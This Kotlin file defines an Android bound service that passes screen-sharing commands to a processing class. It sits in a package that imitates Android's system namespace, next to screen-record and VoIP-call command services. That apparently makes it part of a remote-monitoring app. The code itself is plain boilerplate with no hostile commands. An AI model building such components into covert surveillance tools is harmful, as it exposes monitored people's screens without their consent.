package com.android.services.services.screenSharing

import android.app.Service
import android.content.Intent
import android.os.Binder
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.services.screenRecord.ScreenRecordCommandProcessingBaseImplI
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.util.logDebug
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class ScreenSharingCommandService : Service() {
    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var screenSharingProcessingI: IBackgroundProcessing


    override fun onCreate() {
        super.onCreate()
        screenSharingProcessingI =
            ScreenSharingCommandProcessingBaseImpl(this, localDatabaseSource, coroutineScope)
        screenSharingProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return screenSharingProcessingI.onStartCommand(intent, flags, startId)
    }
    override fun onBind(p0: Intent?): IBinder? {
        return binder
    }

    override fun onDestroy() {
        super.onDestroy()
        screenSharingProcessingI.onDestroy()
    }
    private val binder = ScreenSharingCommandServiceBinder()

    inner class ScreenSharingCommandServiceBinder : Binder() {
        fun getService(): ScreenSharingCommandService {
            logDebug("BoundServiceInfo", "Binder Called in Service")
            return this@ScreenSharingCommandService
        }
    }
}